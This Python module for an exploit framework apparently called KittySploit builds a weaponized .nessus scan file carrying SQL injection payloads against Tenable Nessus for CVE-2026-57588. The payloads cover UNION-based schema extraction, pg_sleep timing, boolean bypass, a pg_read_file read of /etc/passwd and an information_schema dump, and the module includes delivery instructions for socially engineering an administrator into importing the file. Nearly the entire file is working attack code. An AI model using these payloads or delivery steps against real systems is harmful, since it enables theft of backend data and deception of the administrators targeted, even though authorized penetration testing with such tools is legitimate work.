#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pathlib import Path
from typing import List, Sequence, Tuple

from kittysploit import *
from lib.fileformat.mixins import FileformatExploitMixin
from lib.fileformat.nessus import (
    NessusClientData,
    NessusHostTag,
    NessusReportHost,
    NessusReportItem,
    write_nessus_client_data,
)

TagPair = Tuple[str, str]

_CVE_HOST_TAGS: Sequence[TagPair] = (
    ("hostname", "evil-host' UNION SELECT NULL, current_database(), version(), user() -- "),
    ("os", "Linux' AND (SELECT pg_sleep(5))=0 -- "),
    ("ip", "192.168.1.1' OR '1'='1"),
    ("fqdn", "test' ; SELECT pg_read_file('/etc/passwd') -- "),
)

_CVE_PLUGIN_OUTPUT = """Normal output
' UNION ALL SELECT 
    '=== DATA EXFIL START ===',
    table_name,
    column_name,
    '=== DATA EXFIL END ==='
FROM information_schema.columns 
WHERE table_schema = current_schema() -- """


def _host_tags_for_mode(mode: str) -> Sequence[TagPair]:
    mode = (mode or "full").strip().lower()
    if mode == "union":
        return (_CVE_HOST_TAGS[0],)
    if mode == "time":
        return (_CVE_HOST_TAGS[1],)
    if mode == "boolean":
        return (_CVE_HOST_TAGS[2],)
    if mode == "file_read":
        return (_CVE_HOST_TAGS[3],)
    return _CVE_HOST_TAGS


def _build_cve_2026_57588_data(
    *,
    report_name: str,
    host_name: str,
    mode: str,
) -> NessusClientData:
    tags = [NessusHostTag(name, value) for name, value in _host_tags_for_mode(mode)]
    item = NessusReportItem(
        plugin_id="999999",
        plugin_name="CVE-2026-57588 PoC",
        description="Proof of Concept for SQL Injection",
        plugin_output=_CVE_PLUGIN_OUTPUT,
    )
    return NessusClientData(
        report_name=report_name,
        hosts=[NessusReportHost(name=host_name, tags=tags, items=[item])],
    )


class Module(Auxiliary, FileformatExploitMixin):
    __info__ = {
        "name": "Tenable Nessus <= 10.12.0 malicious .nessus SQLi (CVE-2026-57588)",
        "description": (
            "Generate a weaponized Nessus scan result (.nessus XML) that triggers SQL injection "
            "when imported by a privileged Nessus administrator on versions prior to 10.12.1. "
            "Payloads target PostgreSQL (Nessus default backend): UNION metadata exfiltration, "
            "time-based blind (pg_sleep), boolean, file read, and information_schema column dump "
            "in plugin_output. No shell — file delivery for manual import and backend data "
            "exfiltration only. Requires social engineering. Authorized testing only."
        ),
        "author": ["Mohammed Idrees Banyamer", "KittySploit Team"],
        "cve": ["CVE-2026-57588"],
        "references": [
            "https://www.tenable.com",
            "https://github.com/mbanyamer",
            "https://banyamersecurity.com/blog/",
        ],
        "tags": [
            "nessus",
            "tenable",
            "sqli",
            "fileformat",
            "postgresql",
            "import",
            "cve-2026-57588",
            "social-engineering",
            "authorized-only",
        ],
    }

    MODULE_TITLE = "Nessus malicious .nessus SQLi (CVE-2026-57588)"
    OUTPUT_BASENAME = "cve-2026-57588-poc.nessus"

    report_name = OptString(
        "PoC - CVE-2026-57588",
        "Report name embedded in the generated .nessus file",
        required=False,
    )
    host_name = OptString(
        "poc-target.example.com",
        "ReportHost name shown in the malicious import file",
        required=False,
    )
    sqli_mode = OptChoice(
        "full",
        "SQLi payload set: full PoC (all tags) or a single technique",
        required=False,
        choices=["full", "union", "time", "boolean", "file_read"],
    )

    def _generate(self, output_path: Path) -> List[Path]:
        data = _build_cve_2026_57588_data(
            report_name=str(self.report_name or "PoC - CVE-2026-57588"),
            host_name=str(self.host_name or "poc-target.example.com"),
            mode=str(self.sqli_mode or "full"),
        )
        write_nessus_client_data(output_path, data)
        return [output_path.resolve()]

    def run(self):
        return self.run_fileformat(
            self._generate,
            delivery_hint=(
                "Deliver the generated .nessus file to a Nessus administrator and have them "
                "import it via the Nessus web interface (Scan Results → Import). "
                "Observe backend SQL effects in Nessus logs or database query output."
            ),
        )
